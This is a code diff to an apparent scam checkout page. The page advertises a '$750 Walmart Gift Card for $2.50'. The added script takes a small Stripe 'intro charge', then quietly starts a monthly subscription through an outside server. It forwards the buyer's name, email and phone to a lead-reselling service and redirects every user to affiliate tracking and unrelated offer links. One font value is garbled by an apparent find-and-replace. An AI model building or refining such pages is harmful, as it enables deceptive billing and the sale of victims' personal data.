@@ -13,7 +13,7 @@
 
   <meta charset="utf-8"/>
   <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover"/>
-  <title>Get your $2.50 Walmart Gift Card for $2.50!</title>
+  <title>Get your $750 Walmart Gift Card for $2.50!</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;2.50;700;800;900&display=swap" rel="stylesheet">
 
   <style>
@@ -538,21 +538,36 @@
         if(!data.clientSecret){hideLoading();showError("Payment failed");window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
 
         // 2) Confirm the intro charge (handles SCA/3DS)
-        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        const conf=await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){hideLoading();showError(conf.error.message);window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
+        if(!(conf.paymentIntent&&conf.paymentIntent.status==="succeeded")){hideLoading();showError("Payment not completed");window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
 
-// after confirmCardPayment succeeds:
-if (conf && conf.paymentIntent && conf.paymentIntent.status === "succeeded") {
-  // send every user to your success URL
-  const pid = (conf.paymentIntent && conf.paymentIntent.id) || data.paymentIntentId || '';
-  const qb = pid ? ('?v=' + encodeURIComponent(pid)) : ('?t=' + Date.now());
-  window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7" + qb;
-  return;
-}
+        // 3) Start the subscription using the successful intro charge
+        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({
+            paymentIntentId: data.paymentIntentId,
+            priceIdMonthly: MONTHLY_PRICE_ID
+          })
+        });
+        const subData = await subRes.json();
+        if(subData.error){hideLoading();showError(subData.error);window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";return}
 
-// preserve existing error behavior for failures
-if (conf && conf.error) { hideLoading(); showError(conf.error.message); window.location.href = "https://www.united-defence-shield.com/7GQSPJ/27CC71Q"; return; }
-hideLoading(); showError("Payment not completed"); window.location.href = "https://www.united-defence-shield.com/7GQSPJ/27CC71Q";
+        // Send Aceleads lead after successful payment/subscription (best-effort)
+        try{
+          const mobile = normalizePhone(prefix, rawPhone);
+          const countryIso = (billingCountry?.value || undefined);
+          const parts = (nameInput.value || '').trim().split(' ');
+          const fname = parts.shift() || undefined;
+          const lname = parts.join(' ') || undefined;
+          await sendAceleadsLead({ fname, lname, email: emailInput.value, mobile, country: countryIso });
+        }catch(e){ console.warn('Aceleads after-payment error:', e); }
 
+        // Success: redirect ALL users to the specified URL
+        (function(){
+          window.location.href = "https://cudsr.bemobtrcks.com/go/abc281a7-e82a-411b-8b56-1a0228d7d2e7";
+        })();
 
       }catch(e){
         hideLoading();showError(e.message||"Something went wrong");window.location.href="https://www.united-defence-shield.com/7GQSPJ/27CC71Q";
